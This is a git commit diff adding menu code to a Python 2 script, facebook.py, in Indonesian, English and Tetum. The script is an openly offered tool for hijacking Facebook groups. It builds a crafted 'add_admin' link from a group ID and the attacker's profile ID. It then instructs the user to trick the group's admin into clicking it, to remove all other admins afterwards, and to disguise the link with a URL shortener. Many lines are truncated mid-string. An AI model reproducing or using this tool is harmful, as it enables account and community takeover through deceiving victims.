ceb61c5fe89bae43c79cdfbff121508c4e15d59c
whiteoussama <44711273+whiteoussama@users.noreply.github.com>
2018-11-04 13:18:30 +0000

    Update facebook.py

--- facebook.py
+++ facebook.py
@@ -99,4 +99,204 @@ if bahasa.strip() in "01 1".split():
 
   print "%s--------------------%s" % (R, N)
 
-  tahap2 = raw_input("%s2%s)%s Setelah itu
+  tahap2 = raw_input("%s2%s)%s Setelah itu klik url grupnya dan salin 15 digit kode ajaib grup. Contoh punya grup %sADM$
+
+  print "%s--------------------%s" % (R, N)
+
+  tahap3 = raw_input("%s3%s)%s Sekarang masuk ke profilmu dan cari 15 digit kode profilmu. Contoh punya%s saya %s(%s 10$
+
+  print "%s--------------------%s" % (R, N)
+
+  tahap4 = raw_input("%s4%s)%s Bila anda kesusahan mendapatkan kode 15 digit tersebut. Coba masuk lewat browser bawaan.$
+
+  print "%s--------------------%s" % (R, N)
+
+  tahap5 = raw_input("%s5%s)%s Setelah menemukan kode grup korban dan kode profil anda. Kita mulai %spenggabungan kode%$
+
+  grup = raw_input(" %s(%sa%s)%s Kode Grup%s >>>%s " % (W, C, W, C, R, Y))
+
+  anda = raw_input(" %s(%sb%s)%s Kode Anda%s >>>%s " % (W, C, W, C, R, Y))
+
+  print " %s(%s*%s)%s Hasil%s >>> %shttps://m.facebook.com/group/add_admin/?group_id=%s&user_id=%s&added&_rdrChange%s" $
+
+  file.write("https://m.facebook.com/group/add_admin/?group_id=%s&user_id=%s&added&_rdrChange" % (grup, anda))
+
+  print "%s--------------------%s" % (R, N)
+
+  tahap6 = raw_input("%s6%s)%s Sekarang salin link hasil gabungan tersebut lalu kirimkan ke %sadmin%s. Bila anda kesusa$
+
+  print "%s--------------------%s" % (R, N)
+
+  tahap7 = raw_input("%s7%s)%s Anda tinggal menunggu hingga linknya diklik oleh si %sadmin%s grup...%s[%sEnter%s]%s" % $
+
+  print "%s--------------------%s" % (R, N)
+
+  tahap8 = raw_input("%s8%s)%s Bila anda sudah menerima pemberitahuan bahwa anda sudah diangkat sebagai %sadmin%s, anda$
+
+  print "%s--------------------%s" % (R, N)
+
+  tahap9 = raw_input("%s9%s)%s Sekarang bersenang-senanglah %s:)%s...%s[%sEnter%s]%s" % (Y, C, W, Y, W, C, Y, C, N))
+
+  print "%s[%s#%s]%s ------------------%s Selesai %s------------------ %s[%s#%s]%s" % (C, Y, C, B, W, R, C, Y, C, N)
+
+  print
+  time.sleep(1)
+
+  print "%s*catatan:admin yang pintar dan cerdik akan segera mengetahui link yang anda kirimkan hanya dengan melihat li$
+
+  time.sleep(1)
+
+  print "%sTerima kasih%s telah bersedia menggunakan %sprogram saya%s %s:')%s" % (C, W, R, W, Y, N)
+
+  time.sleep(1)
+
+  print "%sSampai Jumpa %s:)%s" % (W, Y, N)
+
+  sys.exit()
+
+
+elif bahasa.strip() in "02 2".split():
+
+  print "%s [%s English%s ]%s" % (C, W, C, N)
+
+  print
+
+  step1 = raw_input("%s1%s)%s First Of All Go To The %sFacebook%s Group That You Want To %sHack%s...%s[%sEnter%s]%s" % $
+
+  print "%s--------------------%s" % (R, N)
+
+  step2 = raw_input("%s2%s)%s After That. Go Click On The Group Url And Then Copy 15 Digits Group Magical Code. Example$
+
+  print "%s--------------------%s" % (R, N)
+
+  step3 = raw_input("%s3%s)%s Now Go To Your Profile And Find Your 15 Digits Profile Code. Example %s(%s 10000413674847$
+
+  print "%s--------------------%s" % (R, N)
+
+  step4 = raw_input("%s4%s)%s If the url didnt show that 15 digit code. Then try to open %sfacebook%s from the browser.$
+
+  print "%s--------------------%s" % (R, N)
+
+  step5 = raw_input("%s5%s)%s After Find Both Codes..%sLet we mix it up%s...%s[%sEnter%s]%s" % (Y, C, W, R, W, C, Y, C,$
+
+  group = raw_input(" %s(%sa%s)%s Group Code%s >>>%s " % (W, C, W, C, R, Y))
+
+  you = raw_input(" %s(%sb%s)%s Your Code%s >>>%s " % (W, C, W, C, R, Y))
+
+  print " %s(%s*%s)%s Result%s >>>%s https://m.facebook.com/group/add_admin/?group_id=%s&user_id=%s&added&_rdrChange%s"$
+
+  file.write("https://m.facebook.com/group/add_admin/?group_id=%s&user_id=%s&added&_rdrChange" % (group, you))
+
+  print "%s--------------------%s" % (R, N)
+
+  step6 = raw_input("%s6%s)%s Now Copy The Link On The Result And Then Send Copied Link To %sAdmin%s Of The Group. If I$
+
+  print "%s--------------------%s" % (R, N)
+
+  step7 = raw_input("%s7%s)%s You Just Need To Wait Till The %sAdmin%s Click On The Link that You Send. Then You Will B$
+
+  print "%s--------------------%s" % (R, N)
+
+  step8 = raw_input("%s8%s)%s Now Don't Waste Your Time. Go To Group Settings And Remove All %sAdmins%s From The Group.$
+
+  print "%s--------------------%s" % (R, N)
+
+  step9 = raw_input("%s9%s)%s Have Fun %s:)%s...%s[%sEnter%s]%s" % (Y, C, W, Y, W, C, Y, C, N))
+
+  print "%s[%s#%s]%s -------------------%s Done %s-------------------- %s[%s#%s]%s" % (C, Y, C, B, W, R, C, Y, C, N)
+
+  print
+
+  time.sleep(1)
+
+  print "%s*note:clever admin can notice the link just by one blink. So i suggest you to use shortlink like goo.gl or b$
+
+  time.sleep(1)
+
+  print "%sThanks%s For %sUsing My Program%s %s:')%s" % (C, W, R, W, Y, N)
+
+  time.sleep(1)
+
+  print "%sGood Bye %s:)%s" % (W, Y, N)
+
+
+elif bahasa.strip() in "03 3".split():
+
+  print " %s[%s Tetum%s ]%s" % (R, W, R, N)
+
+  print
+  tahap1 = raw_input("%s1%s)%s Primeiro, buka grupo iha%s facebook%s neebe ita boot atu%s hack%                        $
+
+  print "%s--------------------%s" % (R, N)
+
+  tahap2 = raw_input("%s2%s)%s Depois klik url grupo nian no kopia 15 digit kode grupo. Exemplo                        $
+
+  print "%s--------------------%s" % (R, N)
+
+  tahap3 = raw_input("%s3%s)%s Agora tama ba ita boot nia profil no buka 15 digit kode profil i                        $
+
+  print "%s--------------------%s" % (R, N)
+
+  tahap4 = raw_input("%s4%s)%s Kuando susar ba ita boot atu buka kode 15 digit nee. Koko loke h                        $
+
+  print "%s--------------------%s" % (R, N)
+
+  tahap5 = raw_input("%s5%s)%s Depois ita boot hetan ona kode grupo nian no ita boot nian kode                         $
+
+  grup = raw_input(" %s(%sa%s)%s Kode Grupo nian%s >>>%s " % (W, C, W, C, R, Y))
+
+  ita = raw_input(" %s(%sb%s)%s Kode Ita boot nian%s >>>%s " % (W, C, W, C, R, Y))
+
+  print " %s(%s*%s)%s Rezultado%s >>> %shttps://m.facebook.com/group/add_admin/?group_id=%s&use                        $
+
+  file.write("https://m.facebook.com/group/add_admin/?group_id=%s&user_id=%s&added&_rdrChange"                         $
+
+  print "%s--------------------%s" % (R, N)
+
+  tahap6 = raw_input("%s6%s)%s Agora kopia link rezultado neebe ita gabung no send ba %sadmin%s                        $
+
+  print "%s--------------------%s" % (R, N)
+
+  tahap7 = raw_input("%s7%s)%s Ita boot hela hein too link nee %sadmin%s klik...%s[%sEnter%s]%s                        $
+
+  print "%s--------------------%s" % (R, N)
+
+  tahap8 = raw_input("%s8%s)%s Kuando ita boot hetan notifikasaun neebe dehan katak ita boot sa                        $
+
+  print "%s--------------------%s" % (R, N)
+
+  tahap9 = raw_input("%s9%s)%s Agora ita boot bele manda grupo ho kontenti %s:)%s...%s[%sEnter%                        $
+
+  print "%s[%s#%s]%s ------------------%s Remata %s------------------ %s[%s#%s]%s" % (C, Y, C,                         $
+
+  print
+
+  time.sleep(1)
+
+  print "%s*nota:admin neebe matenek sei nota link ida ita boot send ba nia nee sei lori perigu                        $
+
+  time.sleep(1)
+
+  print "%sObrigadu%s tamba ita boot uja tia ona%s hau nia program%s %s:')%s" % (C, W, R, W, Y,                        $
+
+  time.sleep(1)
+
+  print "%sAdeus %s:)%s" % (W, Y, N)
+
+  sys.exit()
+
+
+
+else:
+
+        print
+
+        print "%s[%si%s]%s Anda memasukkan perintah yang salah%s" % (Y,R,Y,W,N)
+
+        print "%s[%si%s]%s Wrong Input%s" % (Y,R,Y,W,N)
+
+        print "%s[%si%s]%s Ita boot manda sala%s" % (Y,R,Y,W,N)
+
+        time.sleep(2)
+
+        restart_program()
